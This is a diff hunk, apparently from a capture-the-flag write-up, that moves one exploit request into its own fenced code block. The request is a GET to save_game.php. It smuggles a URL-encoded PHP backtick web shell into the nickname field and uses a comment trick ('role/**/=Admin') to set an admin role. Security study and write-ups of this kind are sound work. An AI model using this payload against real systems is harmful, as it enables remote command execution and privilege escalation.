@@ -212,7 +212,9 @@ This means the extension parameter passed to the backend code is placed directly
 
 The GET request to change the nickname is as follows.
 
-```GET /save_game.php?clicks=10000000&level=10000000&nickname=<%3f%3d`$_GET[0]`%3f>&role/**/=Admin```
+```
+GET /save_game.php?clicks=10000000&level=10000000&nickname=<%3f%3d`$_GET[0]`%3f>&role/**/=Admin
+```
 
 Then I can change the extension within the request.
 
